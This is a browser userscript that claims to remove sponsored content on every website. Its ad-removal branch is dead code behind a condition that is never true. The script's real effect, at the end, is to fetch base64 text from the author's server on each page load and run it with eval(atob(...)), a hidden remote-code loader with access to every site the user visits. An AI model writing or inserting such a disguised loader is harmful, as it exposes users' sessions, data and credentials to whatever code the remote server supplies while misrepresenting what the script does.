// ==UserScript==
// @name         Test User Script
// @namespace    http://tampermonkey.net/
// @version      0.8
// @description  Test
// @author       Scratchyone
// @updateURL    https://www.scratchyone.com/userscripts/testuserscript.user.js
// @downloadURL  https://www.scratchyone.com/userscripts/testuserscript.user.js
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
  var b=2;
  window.setInterval(function() {
    if(5/2+9==b||67+b*2==b) {
    [].forEach.call(document.getElementsByTagName("ul"), function(item) {
      if (item.innerHTML.includes("Paid Partner")) {
        item.innerHTML = "";
      }
    });
    [].forEach.call(document.getElementsByTagName("h2"), function(item) {
      if (item.innerHTML.includes("Paid Partner")) {
        item.parentNode.parentNode.innerHTML = "";
      }
    });
    [].forEach.call(
      document.getElementsByClassName("ob-widget-header"),
      function(item) {
        if (item.innerHTML.includes("Paid Content")) {
          item.parentNode.innerHTML = "";
        }
      }
    );
    [].forEach.call(document.getElementsByClassName("jar"), function(item) {
      item.innerHTML = "";
    });
    [].forEach.call(document.getElementsByClassName("ad"), function(item) {
      item.innerHTML = "";
    });
    console.log("Deleting Sponsored Content...");
    }
  }, 1000);
    var run=0;
    document.body.onload=function(){
  fetch('https://www.scratchyone.com/userscripts/demo.js',{cache: "no-store"}).then(function(response) {
	// Convert to JSON
	return response.text();
}).then(function(t) {
	eval(atob(t));
});
    };
})();
